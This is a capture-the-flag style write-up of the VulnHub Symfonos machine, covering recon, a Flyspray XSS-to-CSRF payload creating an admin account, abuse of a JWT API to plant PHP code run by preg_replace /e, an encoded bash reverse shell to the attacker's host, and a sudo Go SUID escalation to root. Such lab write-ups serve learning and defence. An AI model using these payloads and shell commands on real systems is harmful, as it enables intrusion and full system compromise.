# VulnHub Symfonos Machine Writeup

## Machine Information

- **Platform**: VulnHub
- **Machine Name**: Symfonos
- **Target IP**: 192.168.40.39
- **Operating System**: Linux (CentOS)
- **Difficulty**: Medium
- **Attack Vector**: XSS to CSRF + API Exploitation + preg_replace RCE

## Executive Summary

This writeup documents the exploitation of the Symfonos VulnHub machine, featuring a complex attack chain involving XSS to CSRF for privilege escalation, API manipulation with JWT tokens, and exploitation of the dangerous preg_replace `/e` modifier for remote code execution. The privilege escalation leveraged sudo permissions on the Go binary to achieve root access through a SetUID binary manipulation.

## Reconnaissance

### Port Scanning

```bash
sudo nmap -sS --open -p- -Pn -n --min-rate 5000 192.168.40.39 -oN nmap/scan
```

![Port Scan Results](images/Pasted%20image%2020251011140147.png)

**Open Ports**: 22 (SSH), 80 (HTTP), 3000, 3306 (MySQL), 5000

### Service Enumeration

```bash
sudo nmap -sSCV -p22,80,3000,3306,5000 -Pn -n --min-rate 5000 192.168.40.39 -oN nmap/scanvuln
```

**Services Identified**:

```
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 (CentOS PHP/5.6.40)
3000/tcp open  ppp?
3306/tcp open  mysql   MariaDB (unauthorized)
5000/tcp open  upnp?
```

### Web Directory Enumeration

```bash
gobuster dir -w /home/xon/Desktop/xon/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.40.39 -t 20
```

![Directory Discovery](images/Pasted%20image%2020251011233325.png)

**Interesting Paths**:

- `/posts/`
- `/flyspray/`

## Flyspray Analysis

### Version Identification

![Flyspray Interface](images/Pasted%20image%2020251011230751.png)

**Discovered**: Flyspray version 1.0, vulnerable to XSS attacks.

![Version Confirmation](images/Pasted%20image%2020251011231015.png)

### XSS Vulnerability Research

The `real_name` parameter was identified as vulnerable to stored XSS:

**CVE Details**: XSRF Stored FlySpray 1.0-rc4 (XSS2CSRF)

**Vulnerability**: Input passed via the `real_name` parameter to `/index.php?do=myprofile` is not properly sanitized.

### XSS Proof of Concept

![XSS Testing](images/Pasted%20image%2020251011231645.png)

**Verification**: The field was confirmed vulnerable to XSS injection.

![Comment Section](images/Pasted%20image%2020251011232023.png)

**Attack Vector**: Comment section reviewed by admin users.

## XSS to CSRF Exploitation

### Malicious JavaScript Creation

Created `file.js` with admin account creation payload:

```javascript
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form"action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'
var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

### XSS Injection

**Payload**: `"><script src="http://192.168.40.42/file.js"></script>`

**Hosting**: `python -m http.server 80`

![Script Execution](images/Pasted%20image%2020251011232727.png)

**Result**: Admin executed the malicious script, creating account `hacker:12345678`

### Admin Access

![Admin Login](images/Pasted%20image%2020251011232843.png)

**Credentials Discovered**: `achilles:h2sBr9gryBunKdF9`

![Credentials Found](images/Pasted%20image%2020251011233438.png)

## Gitea Repository Access

### Service Discovery

SSH login failed, but credentials worked on Gitea service (port 3000):

![Gitea Access](images/Pasted%20image%2020251011233800.png)

### Repository Analysis

User `achilles` had two projects, including a backup of the Symfonos blog.

**Database Credentials Found** in `dbconfig.php`:

![Database Config](images/Pasted%20image%2020251011234629.png)

### Vulnerable Code Discovery

Analysis of `index.php` revealed dangerous code:

![Index.php Analysis](images/Pasted%20image%2020251012002039.png)

**Vulnerable Code**:

```php
<?php
include "includes/dbconfig.php";
include "includes/db.php";

$db = new Db();
$result = $db->query("SELECT * FROM `posts` ORDER BY created_at DESC");

while ($row = mysqli_fetch_assoc($result)) {
    $content = htmlspecialchars($row['text']);
    echo $content;
    preg_replace('/.*/e',$content, "Win");
}
?>
```

**Vulnerability**: The `/e` modifier in `preg_replace()` evaluates `$content` as PHP code, enabling Remote Code Execution.

## API Exploitation

### API Discovery

![API Project](images/Pasted%20image%2020251012002205.png)

### JWT Token Acquisition

```bash
curl -s -X POST "http://192.168.40.39:5000/ls2o4g/v1.0/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}'
```

**Response**:

```json
{
  "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA4NTE5MzgsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.NmIgqh4p5pAo7JzIchJ8B04FM4If8dYUQYv3uij_BMI",
  "user":{"display_name":"achilles","id":1,"username":"achilles"}
}
```

### Post Enumeration

```bash
curl -s -X GET "http://192.168.40.39:5000/ls2o4g/v1.0/posts/"
```

### Content Modification Test

```bash
curl -s -X PATCH "http://192.168.40.39:5000/ls2o4g/v1.0/posts/1" \
  -H "Content-Type: application/json" \
  -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -d '{"text":"prueba"}'
```

![Content Modified](images/Pasted%20image%2020251012003954.png)

**Success**: Content modification confirmed.

## Remote Code Execution

### Reverse Shell Payload

Exploiting the `preg_replace()` vulnerability:

```bash
curl -s -X PATCH "http://192.168.40.39:5000/ls2o4g/v1.0/posts/1" \
  -H "Content-Type: application/json" \
  -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -d $'{"text":"system(base64_decode(\'YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC40MC4yMi80NDMgPCYxJw==\'))"}'
```

**Listener**:

```bash
sudo nc -nlvp 443
```

**Result**: Reverse shell obtained as `www-data`.

## Lateral Movement

### User Escalation

Using discovered credentials to switch users:

```bash
su achilles
# Password: h2sBr9gryBunKdF9
```

![User Access](images/Pasted%20image%2020251012005141.png)

**Success**: Gained access as `achilles` user.

## Privilege Escalation

### Sudo Permissions Discovery

![Sudo Permissions](images/Pasted%20image%2020251012005236.png)

**Finding**: `/usr/local/go/bin/go` executable with sudo permissions.

### Go Binary Exploitation

Created malicious Go script `shell.go`:

```go
package main
import (
    "log"
    "os/exec"
)
func main() {
    cmd := exec.Command("chmod","u+s","/bin/bash")
    err := cmd.Run()
    if err!=nil {
        log.Fatal(err)
    }
}
```

**Execution**:

```bash
sudo /usr/local/go/bin/go run shell.go
```

**Root Shell**:

```bash
bash -p
```

![Root Access](images/Pasted%20image%2020251012010247.png)

**Result**: Root privileges achieved.

## Technical Analysis

### Vulnerability Chain

1. **Stored XSS** → Malicious JavaScript injection
2. **CSRF Attack** → Admin account creation
3. **JWT Authentication** → API access token
4. **API Manipulation** → Post content modification
5. **preg_replace RCE** → Remote code execution via `/e` modifier
6. **Credential Reuse** → User escalation
7. **Sudo Go Binary** → Root privilege escalation

### Key Vulnerabilities

- **XSS in Flyspray**: Unsanitized `real_name` parameter
- **CSRF Vulnerability**: Insufficient CSRF protection
- **Dangerous PHP Function**: `preg_replace()` with `/e` modifier
- **API Authorization**: Weak access controls
- **Sudo Misconfiguration**: Go binary with unrestricted permissions

## Key Lessons

1. **Input Sanitization**: Critical for preventing XSS attacks
2. **Deprecated Functions**: The `/e` modifier in `preg_replace()` is dangerous and deprecated
3. **API Security**: Proper authorization and rate limiting required
4. **Sudo Permissions**: Restrict sudo access to interpreters and compilers
5. **Defense in Depth**: Multiple vulnerabilities chained for complete compromise

## Conclusion

The VulnHub Symfonos machine demonstrated a sophisticated multi-stage attack requiring exploitation of web vulnerabilities, API manipulation, and system-level privilege escalation. The machine effectively showcased real-world scenarios where multiple security weaknesses combine to enable complete system compromise, emphasizing the importance of comprehensive security controls at all application layers.
